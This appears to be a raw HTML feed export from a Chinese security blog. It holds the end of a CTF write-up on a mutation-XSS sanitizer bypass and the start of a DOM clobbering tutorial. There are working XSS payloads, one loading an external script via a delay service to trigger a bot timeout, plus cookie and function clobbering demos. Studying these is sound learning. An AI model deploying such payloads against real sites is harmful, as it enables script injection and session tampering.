"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>attributes<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">const</span> att <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_ATTR<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked attribute is :-"</span><span class="token operator">+</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span>                    node<span class="token punctuation">.</span><span class="token function">removeAttributeNode</span><span class="token punctuation">(</span>att<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Final payload:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>    <span class="token keyword">return</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这里直接用前面提到的<code>payload</code>就可以了。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的话不走到<code>catch res</code>就会被覆盖，并且即便你走到<code> puppeteer.ProtocolError</code>这个异常块里因为有个<code>finnaly</code>块，所以也会被覆盖。这里明显就是<code>await page.goto(url, &#123; waitUntil: &#39;domcontentloaded&#39;, timeout: 2000 &#125;);</code>，让这里加载<code>html</code>超过<code>2s</code>就会进入<code>catch</code>从而输出<code>flag</code>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> browser<span class="token punctuation">,</span> page<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^\/note\?/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'Invalid path!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>BASE_URL <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> FLAG<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>            args<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span>                <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            executablePath<span class="token punctuation">:</span> <span class="token string">'/usr/bin/chromium-browser'</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span> waitUntil<span class="token punctuation">:</span> <span class="token string">'domcontentloaded'</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            text <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForFunction</span><span class="token punctuation">(</span>text <span class="token operator">=</span><span class="token operator">></span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">puppeteer<span class="token punctuation">.</span>ProtocolError</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Target closed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> res<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>payload:</code></p><pre><code>/note?text=&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;script src=&#39;https://app.requestly.io/delay/3000/https://www.squirt1e.top/&#39;&gt;&lt;/script&gt;</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ol><li><a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</a></li><li><a href="https://xz.aliyun.com/t/8384">https://xz.aliyun.com/t/8384</a></li><li><a href="https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system">https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 复现 </tag>
            
            <tag> 日常学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dom-clobbering学习+XSS GAME简单题</title>
      <link href="/2023/12/03/dom-clobbering/"/>
      <url>/2023/12/03/dom-clobbering/</url>
      
        <content type="html"><![CDATA[<blockquote><p>好久没学习新知识了，这次来学习下dom-clobbering。正好S&amp;P发了篇关于dom-clobbering的顶会，也顺带看看。不过看顶会前还是要通过实践学习一下DOM破坏的原理。</p></blockquote><h4 id="标签属性引用"><a href="#标签属性引用" class="headerlink" title="标签属性引用"></a>标签属性引用</h4><p>先来看一个例子：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirt1e<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirtle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个<code>form</code>表单，其中使用<code>document</code>对象是无法访问<code>id</code>属性的。其他的无论是直接输出<code>squirt1e</code>还是通过<code>window</code>引用都是可以的。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701500207047.png" alt="1701500207047" width="5%" height="5%" /><p>而<code>object</code>标签却可以被<code>document</code>引用。</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jieni<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jieni123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701500511974.png" alt="1701500511974" width="5%" height="5%" /><h4 id="cookie覆盖"><a href="#cookie覆盖" class="headerlink" title="cookie覆盖"></a>cookie覆盖</h4><pre><code>document.cookievar div=document.createElement(&#39;div&#39;)div.innerHTML=&#39;&lt;img name=cookie&gt;&#39;document.body.appendChild(div)</code></pre><p>创建一个<code>img</code>标签<code>name</code>为<code>cookie</code>。因为我们是通过<code>document.cookie</code>来获取当前页面的<code>cookie</code>的，通过属性引用的特性来覆盖掉<code>document.cookie</code>。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701501208880.png" alt="1701501208880" width="5%" height="5%" /><p>我随便找了个站点，试了试还真能覆盖。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20231202152905362.png" alt="image-20231202152905362" width="5%" height="5%" /><h4 id="覆盖函数"><a href="#覆盖函数" class="headerlink" title="覆盖函数"></a>覆盖函数</h4><p>都能覆盖变量，那肯定能覆盖函数了。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>appendChild<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>appendChild<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>覆盖掉<code>appendChild</code>函数。</p><h4 id="利用toString"><a href="#利用toString" class="headerlink" title="利用toString"></a>利用toString</h4><p>覆盖是覆盖了，但是覆盖个标签也没啥用。我们可以找到重写了<code>toString</code>方法的标签进行利用，这样就是字符串了。</p><pre><code>Object.getOwnPropertyNames(window).filter(p =&gt; p.match(/Element$/)).map(p =&gt; window[p]).filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)</code></pre><p>找到了a以及area标签。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701505033603.png" alt="1701505033603" width="5%" height="5%" /><p><code>alert</code>会把参数转成字符串。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:alert(123)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701505833826.png" alt="1701505833826" width="5%" height="5%" /><h4 id="集合取值"><a href="#集合取值" class="headerlink" title="集合取值"></a>集合取值</h4><p>看到这里的同学可能会有一些想法，比如这种嵌套标签是否也可以打。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaaa:123123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>abcd<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际上这样是不行的</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701506583040.png" alt="1701506583040" width="5%" height="5%" /><p>细心的小伙伴发现我在覆盖函数中用到了这样的嵌套方式。但是我尝试了几个标签发现只有<code>img</code>才可以取到值，这正是后面层级关系提取到的一种情况。而能够利用<code>toString</code>的<code>a,area</code>都不可以通过这种方式取值。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>appendChild<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>appendChild<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而通过构造两个<code>id</code>相同的嵌套标签，制作成集合的形式，再通过<code>name</code>来进行取值是能够取到的。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirt1e<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaaa:123123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abcd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>abcd<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701506974932.png" width="5%" height="5%" /><h4 id="层级关系取值"><a href="#层级关系取值" class="headerlink" title="层级关系取值"></a>层级关系取值</h4><p>用这个脚本，思路就是遍历标签，看哪个标签层级组合能通过<code>a.b</code>的形式取到值。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            html<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'hr'</span><span class="token punctuation">,</span> <span class="token string">'pre'</span><span class="token punctuation">,</span> <span class="token string">'blockquote'</span><span class="token punctuation">,</span> <span class="token string">'ol'</span><span class="token punctuation">,</span> <span class="token string">'ul'</span><span class="token punctuation">,</span> <span class="token string">'li'</span><span class="token punctuation">,</span> <span class="token string">'dl'</span><span class="token punctuation">,</span> <span class="token 